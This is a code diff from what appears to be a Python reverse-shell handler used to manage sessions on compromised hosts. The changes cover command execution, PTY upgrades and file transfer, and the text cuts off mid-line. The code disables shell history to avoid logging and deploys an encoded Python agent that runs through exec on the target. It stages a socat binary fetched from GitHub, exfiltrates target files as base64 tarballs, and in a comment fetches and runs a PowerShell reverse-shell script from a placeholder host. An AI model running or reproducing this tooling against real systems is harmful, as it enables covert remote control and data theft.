-			data = re.sub(rb'(\r\n|\r|\n|\v|\f)', rf'\1{timestamp}'.encode(),data)
+			data = re.sub(rb'(\r\n|\r|\n|\v|\f)', rf'\1{timestamp}'.encode(), data)
 
 		try:
 			if _input:
-				self.logfile.write(bytes(paint('ISSUED ==>','GREEN')+' ', encoding='utf8'))
+				self.logfile.write(bytes(paint('ISSUED ==>', 'GREEN')+' ', encoding='utf8'))
 
 			self.logfile.write(data)
 
@@ -1211,11 +1424,14 @@ class Session:
 
 	def determine(self, path=False):
 		history = ' export HISTFILE=/dev/null;' if options.no_history else ''
-		path = ' export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin;' if path else ''
+		path = f' export PATH=$PATH:{LINUX_PATH};' if path else ''
 		cmd = f'{path} export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`'
 		outcome = b'1337'
 
-		response = self.exec(cmd+'\n', expect=(cmd.encode(), outcome, b"Windows PowerShell"))
+		response = self.exec(cmd+'\n', expect=(cmd.encode(), outcome, b"Windows PowerShell", b'SHELL> ', b'PS>', b'> '), raw=True)
+
+		if not response:
+			return False
 
 		match = re.search (
 			rf"(Microsoft Windows \[Version (.*)\].*){re.escape(cmd)}".encode(),
@@ -1227,32 +1443,44 @@ class Session:
 		if match:
 			self.OS =		'Windows'
 			self.type =		'Basic'
+			self.subtype = 	'cmd'
 			self.interactive =	 True
 			self.echoing =		 True
-			self.prompt =		match[1]
+			self.prompt =		match[1].replace(b"'export' is not recognized\
+			 as an internal or external command,\r\noperable program or batch file.\r\n", b"") # TODO
 			self.version =		match[2]
 			return True
 
-		# Windows Powershell socket
+		# Windows Powershell
 		if re.match(
 			rf"{outcome.decode()}.*\r\nPS [A-Za-z]:\\".encode(),
 			response,
 			re.DOTALL
-		):
+		) or response in (b'SHELL> ', b'PS>', b'> '):
 			self.OS =		'Windows'
 			self.type =		'Basic'
+			self.subtype = 	'psh'
 			self.interactive =	 True
 			self.echoing =		 False
 			self.prompt =		response.splitlines()[-1]
 			return True
 
 		# Windows Powershell PTY
-		if b"Windows PowerShell" in response:
+		if b"Windows PowerShell" in response: # TODO
+			response = response + self.exec(expect=(b"PS ",)) # maybe needs raw=True
+			if b"\x1b" in response:
+				self.type = 'PTY'
+			else:
+				self.type = 'Basic' # TODO
+				self.exec(expect=(b"PS ",))# maybe needs raw=True
 			self.OS =		'Windows'
-			self.type =		'PTY'
+			self.subtype = 	'psh'
 			self.interactive =	 True
-			self.echoing =		 True
+			self.echoing =		 True # TEMP
 			self.prompt =		response
+			#self.type='Basic'
+			#self.exec("$CommandLine", raw=True)
+			#self.type = 'Basic' if not b"\x1b" in self.exec("\n", expect=(b"\r\n",), raw=True) else 'PTY' # TODO
 			return True
 
 		# Unix without PATH
@@ -1306,333 +1534,517 @@ class Session:
 
 		return None
 
-	def exec(self, cmd=None, raw=True, timeout=None, expect=[], clear=True):
-		# will convert to TLV
-		try:
-			self.lock.acquire()
-#			if not self.control.empty:
-#				self.control.read()
-			start = None
-			output = b''
+	def exec(
+		self,
+		cmd=None, 		# The command line to run
+		raw=False, 		# Delimiters
+		value=False,		# Will use the output elsewhere?
+		timeout=False,		# Timeout
+		expect=None,		# Items to wait for in the response
+		bypass=False,		# Control session usage
+		preserve_dir=True,	# Current dir preservation when using control session
+		receive=True,		# Send cmd via this method but receive with TLV method
+		agent_typing=False	# Simulate typing on shell (for agent)
+	):
 
+		with self.lock:
+
+			if self.agent and not agent_typing: # TODO environment will not be the same as shell
+				if cmd:
+					self.send(Messenger.message(Messenger.SHELL_EXEC, cmd.encode())) 
+					return self.responses.get()
+				return None
+
+			if self.need_control_session and not bypass:
+				if preserve_dir:
+					self.control_session.exec(f"cd {self.cwd}")
+				args = locals()
+				del args['self']
+				response = self.control_session.exec(**args)
+				if preserve_dir:
+					self.control_session.exec("cd -")
+				return response
+
+			if not self or not self.subchannel.can_use:
+				logger.debug("Exec: The session is killed")
+				return False
+
+			self.subchannel.active = True
+			self.subchannel.result = None
+			buffer = io.BytesIO()
+			_start = time.perf_counter()
+
+			# Constructing the payload
 			if cmd is not None:
 				cmd = cmd.encode()
 
-				if not raw:
-					token = str(uuid.uuid4())
-					if self.OS == 'Unix':
-						cmd = (	f" export DELIMITER={token}; echo $DELIMITER$({cmd.decode()})"
-							f"$DELIMITER\n".encode()
-						)
-
-					elif self.OS == 'Windows': # placeholder
-						cmd = cmd
-				else:
+				if raw:
 					if self.OS == 'Unix':
 						cmd = b' ' + cmd + b'\n'
 
-				if self.echoing:
-					echoable = bytearray(cmd)
-
-				if not self.type == 'Basic' and clear:
-					if self.OS == 'Unix':
-						precmd = b'\x1a\x05\x15' # Ctrl-Z + Ctrl-E + Ctrl-U
-						logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {precmd}")
-						self.socket.sendall(precmd)
-
 					elif self.OS == 'Windows':
-						...#cmd = b'\x03' + cmd # Ctrl-C
-				try:
+						cmd = cmd + b'\r\n'
+				else:
+					token = [rand(10) for _ in range(4)]
 
-					logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {cmd}")
-
-					self.socket.sendall(cmd)
-
-					start = time.perf_counter()
-
-				except OSError as e:
-					if e.errno == errno.EBADF:
-						self.lock.release()
-						return None
-
-				if not self.type == 'Basic' and clear:
 					if self.OS == 'Unix':
-						...
-						#postcmd=b'\x19' # Ctrl-Y
-						#logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {postcmd}")
-						#self.socket.sendall(postcmd)
+						cmd = (
+							f" {token[0]}={token[1]} {token[2]}={token[3]};"
+							f"echo -n ${token[0]}${token[2]};"
+							f"{cmd.decode()};"
+							f"echo -n ${token[2]}${token[0]}\n".encode()
+						)
 
-					elif self.OS == 'Windows':
-						...#cmd = b'\x03' + cmd # Ctrl-C
+					elif self.OS == 'Windows': # TODO
+						if self.subtype == 'cmd':
+							sep = '&'
+						elif self.subtype == 'psh':
+							sep = ';'
+						cmd = (
+							f"set {token[0]}={token[1]}{sep}set {token[2]}={token[3]}\r\n"
+							f"echo %{token[0]}%%{token[2]}%{sep}{cmd.decode()}{sep}"
+							f"echo %{token[2]}%%{token[0]}%\r\n".encode()
+						)
 
-			if timeout is None:
-				timeout = options.short_timeout
+					self.subchannel.pattern = re.compile(
+						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
+						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)
 
-			initial_timeout = timeout
+				logger.debug(f"\n\n{paint('Command sent', 'YELLOW')}: {cmd.decode()}")
+				if self.agent and agent_typing:
+					cmd = Messenger.message(Messenger.SHELL, cmd)
+				self.send(cmd)
+				if not receive:
+					self.subchannel.result = False
 
-			with io.BytesIO() as control_buffer:
-				while True:
-					logger.debug(paint("Waiting for data...", 'blue'))
-					readables, _, _ = select.select([self.socket,self.control], [], [], timeout)
-					stop = time.perf_counter()
-					if start:
-						logger.debug(f"Latency: {start-stop}")
-					start = time.perf_counter()
+				self.subchannel.allow_receive_data = False
 
-					if self.control in readables:
-						for command in self.control.get():
-							logger.debug(f"Control Queue ID {self.id}: {command}")
-							if command == 'stop':
-								break
+			data_timeout = options.short_timeout if timeout is False else timeout
+			continuation_timeout = options.latency
 
-					if self.socket in readables:
-						data = self.socket.recv(NET_BUF_SIZE)
+			timeout = data_timeout
+			last_data = time.perf_counter()
+			need_check = False
+			while self.subchannel.result is None:
 
-						if not data:
-							raise BrokenPipeError
+				logger.debug(paint(f"Waiting for data (timeout={timeout})...", 'blue'))
+				readables, _, _ = select.select([self.subchannel.control, self.subchannel], [], [], timeout)
 
-						logger.debug(f"{paint('Received','GREEN')} -> {data}")
+				if self.subchannel.control in readables:
+					command = self.subchannel.control.get()
+					logger.debug(f"Subchannel Control Queue: {command}")
 
-						if cmd and self.echoing and echoable:
-							for byte in data:
-								#print(f"examine {byte}")
-								if not echoable:
-									control_buffer.write(bytes([byte]))
-									#print(f"wrote {bytes([byte])}")
-									if not timeout == self.latency:
-										logger.debug("Echoable is exchausted!")
-										timeout = self.latency
-										logger.debug(f"{paint('Switched to Latency (2)','yellow')}")
+					if command == 'stop':
+						self.subchannel.result = False
+						break
 
-								if echoable and byte == echoable[0]:
-									#print(f"deleting: {chr(echoable[0])}")
-									echoable.pop(0)
-							continue
+					elif command == 'kill':
+						self.subchannel.can_use = False
+						self.subchannel.result = False
+						break
 
-						control_buffer.write(data)
-						if not timeout == self.latency:
-							timeout = self.latency
-							logger.debug(f"{paint('Switched to Latency (1)','yellow')}")
+					self.subchannel.control.done()
+
+				if self.subchannel in readables:
+					logger.debug(f"Latency: {time.perf_counter() - last_data}")
+					last_data = time.perf_counter()
+
+					data = self.subchannel.read()
+					buffer.write(data)
+					logger.debug(f"{paint('Received', 'GREEN')} -> {data}")
+
+					if timeout == data_timeout:
+						timeout = continuation_timeout
+						need_check = True
+
+				else:
+					if timeout == data_timeout:
+						logger.debug(paint("TIMEOUT", 'RED'))
+						self.subchannel.result = False
+						break
 					else:
-						if timeout != self.latency:
-							output = control_buffer.getvalue()
-							logger.debug(paint("TIMEOUT",'RED','white'))
+						need_check = True
+						timeout = data_timeout
+
+				if need_check:
+					need_check = False
+
+					if self.echoing and cmd and raw:
+						result = buffer.getvalue()
+						if re.search(re.escape(cmd) + b'.' if self.interactive else b'', result, re.DOTALL):
+							self.subchannel.result = result.replace(cmd, b'')
 							break
 						else:
-							logger.debug(paint("Latency expired",'RED','white'))
-							if not raw:
-								result = re.search(
-						rf"{token}(.*){token}[\r\n]{{1,2}}{'.' if self.interactive else ''}".encode(),
-						control_buffer.getvalue()
-								)
-								if result:
-									#print(control_buffer.getvalue())
-									logger.debug(paint('Got all data!','green'))
-									output = result[1]
-									break
-								else:
-									logger.debug(paint('Did not get all data. Receive again...','yellow'))
-									timeout = initial_timeout
-							else:
-								if expect:
-									for token in expect:
-										if token in control_buffer.getvalue():
-											logger.debug(paint(f"Token {token} found in data",'yellow'))
-											break
-									else:
-										logger.debug(paint('No token found in data. Receive again...','yellow'))
-										timeout = initial_timeout
-										continue
+							logger.debug("The echoable is not exhausted")
+							continue
+					if not raw:
+						check = self.subchannel.pattern.search(buffer.getvalue())
+						if check:
+							logger.debug(paint('Got all data!', 'green'))
+							self.subchannel.result = check[1]
+							break
+						logger.debug(paint('We didn\'t get all data; continue receiving', 'yellow'))
 
-								#if self.interactive and not control_buffer.getvalue(): #NEED FIX
-								#	timeout=initial_timeout
-								#	continue
-
-								logger.debug(paint('Maybe got all data.','yellow'))
-								output = control_buffer.getvalue()
+					elif expect:
+						for item in expect:
+							if item in buffer.getvalue():
+								logger.debug(paint(f"The expected string {item} found in data", 'yellow'))
+								self.subchannel.result = buffer.getvalue()
 								break
+						else:
+							logger.debug(paint('No expected strings found in data. Receive again...', 'yellow'))
 
-			logger.debug(f"{paint('FINAL RESPONSE: ','BLUE','white')}{output}")
+					else:
+						logger.debug(paint('Maybe got all data !?', 'yellow'))
+						self.subchannel.result = buffer.getvalue()
+						break
 
-			self.lock.release()
+			_stop = time.perf_counter()
+			logger.debug(f"{paint('FINAL TIME: ', 'BLUE', 'white')}{_stop - _start}")
 
-			return output
+			if value and self.subchannel.result is not False:
+				self.subchannel.result = self.subchannel.result.rstrip().decode()
+			logger.debug(f"{paint('FINAL RESPONSE: ', 'BLUE', 'white')}{self.subchannel.result}")
+			self.subchannel.active = False
 
-		except (ConnectionResetError, BrokenPipeError, ValueError,OSError):
-			logger.debug(paint("Connection terminated abnormally",'RED','white'))
-			self.lock.release()
-			self.exit()
-			return b''
+			return self.subchannel.result
+
+	def need_binary(self, name, url):
+		options = f"\n  1) Upload {paint(url, 'blue')}{paint('', 'magenta')}\n  2) Upload local {name} binary\n  3) Specify remote {name} binary path\n  4) None of the above\n"
+		print(paint(options, 'magenta'))
+		answer = ask("Select action")
+
+		if answer == "1":
+			return self.upload(
+				url,
+				remote_path=self.tmp,
+				randomize_fname=False
+			)[0]
+
+		elif answer == "2":
+			local_path = ask(f"Enter {name} local path")
+			if local_path:
+				if os.path.exists(local_path):
+					return self.upload(
+						local_path,
+						remote_path=self.tmp,
+						randomize_fname=False
+					)[0]
+				else:
+					logger.error("The local path does not exist...")
+
+		elif answer == "3":
+			remote_path = ask(f"Enter {name} remote path")
+			if remote_path:
+				if not self.exec(f"test -f {remote_path} || echo x"):
+					return remote_path
+				else:
+					logger.error("The remote path does not exist...")
+
+		elif answer == "4":
+			return False
+
+		return self.need_binary(name, url)
 
 	def upgrade(self):
 
-		self.upgrade_attempted = True
+		if self.type == 'PTY':
+			logger.warning("The shell is already PTY...")
+			return False
+
 		logger.info("Attempting to upgrade shell to PTY...")
 
 		if self.OS == "Unix":
-			token = str(uuid.uuid4())
-			cmd = (f'export TERM=xterm-256color PTY="import pty; pty.spawn(\'/bin/bash\')";'
-			f'{{ python3 -c "$PTY" || python -c "$PTY"; }} 2>/dev/null ; if [ $? -eq 127 ];'
-			f'then echo {token}; else exit 0; fi')
+			deploy_agent = False
 
-			if options.no_python:
-				cmd = cmd.replace('python',rand())
-
-			response = self.exec(cmd, clear=False)
-			if not response:
-				logger.error("The shell became unresponsive. Killing it...")
-				self.kill()
-				self.detach(killed=True)
+			shell = self.bin['bash'] if self.bin['bash'] else self.bin['sh']
+			if not shell:
+				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
 
-			if token in response.decode():
-				if self.interactive and re.search(rf'{token}[\r\n]{{1,2}}$', response.decode()):
-					self.exec()
+			socat_cmd = f"{{}} - exec:{shell},pty,stderr,setsid,sigint,sane;exit 0"
 
-				logger.error("Cannot obtain PTY shell - python does not exist on target. Attempting to obtain Advanced shell...")
-				if self.type == 'Advanced':
-					logger.debug("This is already bash -i")
-					logger.info("The shell upgraded to Advanced")
-					#self.record(self.prompt)
-					return True
+			if self.bin['python3'] or self.bin['python']:
+				if self.bin['python3']:
+					_bin = self.bin['python3']
+					_exec = 'exec(_value, globals(), _locals)'
 
-				cmd = f"bash -i 2>&1 ; if [ $? -eq 127 ]; then echo {token}; else exit 0; fi"
+				elif self.bin['python']:
+					_bin = self.bin['python']
+					_exec = 'exec _value in globals(), _locals'
 
-				if options.no_bash:
-					cmd = cmd.replace('bash',rand())
+				deploy_agent = True
+				payload = base64.b64encode( zlib.compress(
+					AGENT.format(
+					textwrap.indent(MESSENGER, "\t", lambda line: not line.startswith("class")),
+					shell,
+					_exec,
+					).encode())).decode()
+				cmd = (
+					f'{_bin} -c \'import base64,zlib;exec(zlib.decompress(base64.b64decode("{payload}")));agent()\''
+				)
 
-				response = self.exec(cmd)
+			elif self.bin['script']:
+				_bin = self.bin['script']
+				cmd = f"{_bin} -q /dev/null; exit 0"
 
-				if not token in response.decode() and not response.startswith(b'sh: '):
-					logger.info("The shell upgraded to Advanced")
-					self.type =		'Advanced'
-					self.interactive =	 True
-					self.echoing =		 True
-					self.prompt =		response
-				else:
-					if self.interactive and not re.search(rf'{token}[\r\n]{{1,2}}.', response.decode()):
-						self.exec()
-
-					logger.error("bash does not exist on target. Falling back to basic shell support")
-
-					self.prompt = self.exec("sh -i;exit 0")
-					self.type = 		'Basic'
-					self.interactive =	 True
+			elif self.bin['socat']:
+				_bin = self.bin['socat']
+				cmd = socat_cmd.format(_bin)
 
 			else:
-				logger.info(f"Shell upgraded successfully! 💪")
+				_bin = self.tmp + '/socat'
+				if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
+					cmd = socat_cmd.format(_bin)
 
-				self.type =		'PTY'
-				self.interactive =	 True
-				self.echoing =		 True
+				else:
+					logger.warning("Cannot upgrade shell with the available binaries...")
+					socat_binary = self.need_binary(
+						"socat",
+						"https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
+						)
+					if socat_binary:
+						_bin = socat_binary[0]
+						cmd = socat_cmd.format(_bin)
 
-				self.prompt = response
+					else:
+						if self.bin['bash']:
+							if self.type == 'Advanced':
+								logger.debug("This is already bash -i")
+							else:
+								response = self.exec(f"{self.bin['bash']} -i 2>&1;exit 0", raw=True)
+							self.type =		'Advanced'
+							self.interactive =	 True
+							self.echoing =		 True
+							self.prompt =		response
+							logger.info(
+			f"The shell upgraded to Advanced ({paint('Tab and arrow keys are working', 'UNDERLINE')}{paint('', 'green')})"
+							)
 
-				self.update_pty_size()
+						elif self.bin['sh']:
+							logger.error("bash does not exist on target. Falling back to basic shell support")
+							self.prompt = self.exec(f"{self.bin['sh']} -i 2>&1;exit 0", raw=True)
+							self.type = 		'Basic'
+							self.interactive =	 True
+
+						return True
+
+			if not deploy_agent and not self.spare_control_sessions: #### TODO
+				logger.warning("Agent cannot be deployed. I need to maintain at least one basic session...")
+				core.session_wait_host = self.name
+				self.spawn()
+
+				try:
+					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
+					core.session_wait_host = None
+
+				except queue.Empty:
+					logger.error("Failed spawning new session")
+					return False
+
+				new_session.upgrade()
+				if caller() == 'attach':
+					new_session.attach()
+
+				return False
+
+			response = self.exec(f'export TERM=xterm-256color; export SHELL={shell}; {cmd}', receive=not deploy_agent, raw=True)
+			if not response and not deploy_agent:
+				logger.error("The shell became unresponsive. I am killing it...")
+				self.kill()
+				return False
+
+			logger.info(f"Shell upgraded successfully using {paint(_bin, 'yellow')}{paint('', 'green')}! 💪")
+
+			self.type =		'PTY'
+			self.interactive =	 True
+			self.echoing =		 True
+			self.prompt =		response
+
+			self.agent = 		deploy_agent
+
+			self.pid = self.exec("echo $$", bypass=True, agent_typing=True, value=True) # TODO may return False
+			if not self.pid: # TODO
+				logger.error("Cannot get the PID of the shell. I am killing it...")
+				self.kill()
+				return False
+
+			if not self.agent: # TODO check for the binaries
+				self.tty = self.exec(f"readlink -f /proc/{self.pid}/fd/0", bypass=True, value=True)
 
 		elif self.OS == "Windows":
-			self.type = 'Basic'
 			logger.warning("Upgrading Windows shell is not implemented yet.")
+			#self.exec(f"powershell iex (New-Object Net.WebClient).DownloadString('http://X.X.X.X/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell {self._host} {self._port}", raw=False)
+			#self.detach()
+			#core.sessions[self.id + 1].attach()
 
 		return True
 
 	def update_pty_size(self):
-		#return False
-		#Will change it to SIGWINCH
-		current_dimensions = os.get_terminal_size()
-		if self.dimensions != current_dimensions or self.need_resize:
-			self.dimensions = current_dimensions
-			if self.OS == 'Unix':
-				if self.alternate_buffer:
-					logger.error(
-						"(!) Need PTY resize. Please exit the current alternate buffer program"
-					)
-					self.need_resize = True
-				else:
-					cmd = f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
-					self.exec(cmd, raw=False)
-					self.need_resize = False
-			elif self.OS == 'Windows':
-				cmd = (
-					f"$width={self.dimensions.columns};$height={self.dimensions.lines};"
-					f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size "
-					f"($width, $height);$Host.UI.RawUI.WindowSize = New-Object -TypeName "
-					f"System.Management.Automation.Host.Size -ArgumentList ($width, $height)\r"
-				)
-				self.exec(cmd)
-				self.need_resize = False
+
+		columns, lines = shutil.get_terminal_size()
+
+		if self.agent:
+			self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
+
+		elif self.OS == 'Unix':
+			#if self.alternate_buffer:
+			#	logger.error(
+			#		"(!) Need PTY resize. Please exit the current alternate buffer program"
+			#	)
+			#	self.need_resize = True
+			#elif self.is_attached:
+			#	logger.error(
+			#		"(!) Please detach and attach again to resize the terminal"
+			#	)
+			#	self.need_resize = True
+			#else:
+			#	cmd = f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
+			#	self.exec(cmd, raw=False)
+			#	self.need_resize = False
+			self.exec(f"stty rows {lines} columns {columns} -F {self.tty}", preserve_dir=False)
+
+		elif self.OS == 'Windows':
+			cmd = (
+				f"$width={self.dimensions.columns};$height={self.dimensions.lines};"
+				f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size "
+				f"($width, $height);$Host.UI.RawUI.WindowSize = New-Object -TypeName "
+				f"System.Management.Automation.Host.Size -ArgumentList ($width, $height)\r"
+			)
+			self.exec(cmd, raw=True) #TEMP
+			#self.need_resize = False
+
+		return True
 
 	def attach(self):
-		if not options.no_upgrade and not self.upgrade_attempted:
-			if not self.type == 'PTY' and not self.upgrade():
-				return False
 
-		if not self:
+		if threading.current_thread().name != 'Core':
+
+			if self.new:
+				self.new = False
+
+				if not options.no_upgrade and not self.type == 'PTY':
+					self.upgrade()
+
+				if self.prompt:
+					self.record(self.prompt)
+
+			core.control << f'self.sessions[{self.id}].attach()'
+			return True
+
+		if core.attached_session is not None:
 			return False
 
-		if self.new:
-			self.new = False
-			if self.prompt:
-				self.record(self.prompt)
+		core.attached_session = self
+		core.rlist.append(sys.stdin)
 
 		logger.info(
-				f"Interacting with session {paint('['+str(self.id)+']','red')}"
-				f"{paint(', Shell Type:','green')} {paint(self.type,'CYAN')}"
-				f"{paint(', Menu key:','green')} "
-				f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl+C','MAGENTA')} "
+				f"Interacting with session {paint('['+str(self.id)+']', 'red')}"
+				f"{paint(', Shell Type:', 'green')} {paint(self.type, 'CYAN')}"
+				f"{paint(', Menu key:', 'green')} "
+				f"{paint(options.escape['key'] if self.type == 'PTY' else 'Ctrl+C', 'MAGENTA')} "
 			)
+
 		if not options.no_log:
-			logger.info(f"{paint('Logging to ','green')}{paint(self.logpath,'yellow','DIM')} 📜")
+			logger.info(f"{paint('Logging to ', 'green')}{paint(self.logpath, 'yellow', 'DIM')} 📜")
 
 		os.write(sys.stdout.fileno(), bytes(self.last_lines))
 
 		if self.type == 'PTY':
 			tty.setraw(sys.stdin)
+			os.kill(os.getpid(), signal.SIGWINCH)
+
 		elif self.type == 'Advanced':
 			tty.setcbreak(sys.stdin)
 
-		core.attached_session = self
-		core.control << '+stdin'
+		return True
 
-	def detach(self, killed=False):
-		core.control << '-stdin'
+	def detach(self):
+
+		if threading.current_thread().name != 'Core':
+			core.control << f'self.sessions[{self.id}].detach()'
+			return
+
+		if core.attached_session is None:
+			return False
+
 		core.attached_session = None
+		core.rlist.remove(sys.stdin)
 
 		if not self.type == 'Basic':
 			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)
 
-		if killed:
-			if options.single_session and not core.sessions:
-				core.stop()
-				return
-		else:
+		if self.id in core.sessions:
 			print()
 			logger.warning("Session detached...")
-			#print()
-
-		if self.id in core.sessions:
 			menu.set_id(self.id)
 		else:
-			menu.set_id(None)
+			if options.single_session and len(core.sessions) == 0:
+				core.stop()
+				return
+		menu.show()
 
-		if core.started:
-			menu.show()
+		return True
 
 	def download(self, remote_item_path):
+		remote_globs = [glob for glob in shlex.split(remote_item_path)]
+		local_download_folder = self.directory / "downloads"
+		try:
+			local_download_folder.mkdir(parents=True, exist_ok=True)
+		except Exception as e:
+			logger.error(e)
+			return []
+
+		available_bytes = shutil.disk_usage(local_download_folder).free
+
 		if self.OS == 'Unix':
+			self.progress_recv = PBar(0, paint(f"[+] {paint('', 'blue', 'DIM')}--- ⇣ Downloading", 'green'), 35)
+			self.progress_recv.queue = queue.SimpleQueue()
+
 			try:
-				remote_globs = [glob for glob in shlex.split(remote_item_path)]
-				local_download_folder = self.directory / "downloads"
-				local_download_folder.mkdir(parents=True, exist_ok=True)
+				logger.info(paint('--- Remote packing...', 'blue', 'DIM'))
+				if self.agent:
+					self.send(Messenger.message(Messenger.PYTHON_EXEC, f"os.chdir('{self.cwd}')".encode()))
+					self.send(Messenger.message(Messenger.DOWNLOAD, remote_item_path.encode()))
+					size = int(self.responses.get())
+					if size < 0:
+						logger.error(self.responses.get().decode())
+						return False
+				else:
+					temp = self.tmp + "/" + rand(8)
+					cmd = f"tar cz {remote_item_path} 2>/dev/null | base64 -w0 > {temp} && stat --printf='%s' {temp}"
+					size = int(self.exec(cmd, timeout=None))
 
-				cmd = f"tar cz {remote_item_path} 2>/dev/null|base64 -w0"
-				data = self.exec(cmd, raw=False, timeout=options.long_timeout)
+				logger.info(paint(f"--- Need to get {paint('', 'yellow', 'DIM')}{size:,}{paint('', 'blue', 'DIM')} bytes...", 'blue', 'DIM'))
 
+				# Check for local available space
+				need = size - available_bytes
+				if need > 0:
+					logger.error("Not enough space to download")
+					logger.info(paint(f"--- We need {paint('', 'yellow', 'DIM')}{need:,}{paint('', 'blue', 'DIM')} more bytes...", 'blue', 'DIM'))
+					return False
+
+
+				if not self.agent:
+					data = base64.b64decode(self.exec( f"cat {temp}"))
+					self.exec(f"rm {temp}")
+
+				self.progress_recv.end = size
+
+				while self.progress_recv.active:
+					received = self.progress_recv.queue.get()
+					self.progress_recv.update(received)
+				del self.progress_recv
+
+				if self.agent:
+					data = self.responses.get()
+
+				logger.info(paint('--- Local unpacking...', 'blue', 	'DIM'))
 				if not data:
 					logger.error("Corrupted response")
 					return []
 
-				tar = tarfile.open(fileobj=io.BytesIO(base64.b64decode(data)))
+				tar = tarfile.open(fileobj=io.BytesIO(data))
 
 				items = tar.getnames()
 				if not items:
@@ -1659,7 +2071,7 @@ class Session:
 				specified = specified.intersection(downloaded)
 
 				for item in specified:
-					logger.info(f"Successful download! {paint(pathlink(item),'DIM','yellow')}")
+					logger.info(f"Successful download! {paint(pathlink(item), 'DIM', 'yellow')}") # PROBLEM with ../ TODO
 
 				return specified
 
@@ -1668,14 +2080,52 @@ class Session:
 				return []
 
 		elif self.OS == 'Windows':
-			logger.warning("Download on Windows shells is not implemented yet")
+			tempfile = f"{self.tmp}\\{rand(10)}.zip"
 
-	def upload(self, local_item_path):
+			#cmd = f"certutil -encode {remote_item_path} {tempfile} > nul && type {tempfile} && del {tempfile}"
+			#data = base64.b64decode(b''.join(data.splitlines()[2:-1]))
+			#cmd = psh
+
+			cmd = (
+				f'powershell -command "compress-archive -path \\"{remote_item_path}\\" -DestinationPath \\"{tempfile}\\"";'
+				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
+				'Remove-Item $archivepath;'
+				'Write-Host $b64"'
+
+			)
+
+			#print(cmd)
+
+			data = self.exec(cmd)
+
+			try:
+				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
+					for item in zipdata.infolist():
+						item.filename = item.filename.replace('\\', '/')
+						newpath = Path(zipdata.extract(item, path=local_download_folder))
+						logger.info(f"Successful download! {paint(pathlink(newpath), 'DIM', 'yellow')}")
+
+			except zipfile.BadZipFile:
+				logger.error("Invalid zip format")
+
+			except binascii.Error:
+				logger.error("The item does not exist or access is denied")
+
+	def upload(self, local_item_path, remote_path=None, randomize_fname=False):
+
 		if self.OS == 'Unix':
+
+			if not self.agent:
+				# Check if we can upload
+				dependencies = ['echo', 'base64', 'tar', 'rm']
+				for binary in dependencies:
+					if not self.bin[binary]:
+						logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
+						return False
 
 			local_item_path = os.path.expanduser(local_item_path)
 			data = io.BytesIO()
-			tar = tarfile.open(mode='w:gz', fileobj=data)
+			tar = tarfile.open(mode='w:gz', fileobj=data, format=tarfile.GNU_FORMAT)
 
 			if re.match('(http|ftp)s?://', local_item_path, re.IGNORECASE):
 
@@ -1686,7 +2136,7 @@ class Session:
 				req = urllib.request.Request(local_item_path, headers={'User-Agent':options.useragent})
 
 				try:
-					logger.info(paint(f"... ⇣  Downloading {local_item_path}", 'blue', 'DIM'))
+					logger.info(paint(f"--- ⇣  Downloading {local_item_path}", 'blue', 'DIM'))
 					response = urllib.request.urlopen(req, timeout=options.short_timeout)
 					filename = response.headers.get_filename()
 					items = [response.read()]
@@ -1694,9 +2144,6 @@ class Session:
 				except Exception as e:
 					logger.error(f"Cannot download: {e}")
 					return False
-
-				else:
-					logger.info(paint("... ⇥  Download completed. Pushing it to the target", 'blue', 'DIM'))
 
 			elif local_item_path.startswith(os.path.sep):
 				items = list(Path(os.path.sep).glob(local_item_path.lstrip(os.path.sep)))
@@ -1707,22 +2154,24 @@ class Session:
 				logger.warning(f"Not found: ({local_item_path})")
 				return False
 
+			logger.info(paint("--- Local packing...", 'blue', 'DIM'))
+
 			altnames = []
 			for item in items:
 
-				if isinstance(item,bytes):
+				if isinstance(item, bytes):
 					name = Path(filename.strip('"')) if filename else Path(local_item_path.split('/')[-1])
-					altname = f"{name.stem}-{rand()}{name.suffix}"
+					altname = f"{name.stem}-{rand(8)}{name.suffix}" if randomize_fname else name.name
 
 					file = tarfile.TarInfo(name=altname)
 					file.size = len(item)
 					file.mode = 0o770
 					file.mtime = int(time.time())
 
-					tar.addfile(file,io.BytesIO(item))
+					tar.addfile(file, io.BytesIO(item))
 
 				else:
-					altname = f"{item.stem}-{rand()}{item.suffix}"
+					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
 
 					try:
 						tar.add(item, arcname=altname)
@@ -1736,101 +2185,489 @@ class Session:
 
 			tar.close()
 
-			data = base64.b64encode(data.getvalue())
+			data = data.getvalue() if self.agent else base64.b64encode(data.getvalue())
+			size = len(data)
 
-			temp = '/tmp/'+rand()
-			for chunk in chunks(data.decode(), options.upload_chunk_size):
-				self.exec(f"echo -n {chunk} >> {temp}",raw=False)
+			logger.info(paint(f"--- Need to send {paint('', 'yellow', 'DIM')}{size:,}{paint('', 'blue', 'DIM')} bytes...", 'blue', 'DIM'))
 
-			cmd = f"base64 -d {temp} | tar xz 2>&1"
-			response = self.exec(cmd, raw=False)
-
-			if not response:
-				for item in altnames:
-					logger.info(f"Successful upload! {paint('('+str(item)+')','DIM','yellow')}")
+			# Check remote space
+			if self.agent:
+				self.send(Messenger.message(Messenger.PYTHON_EXEC, 
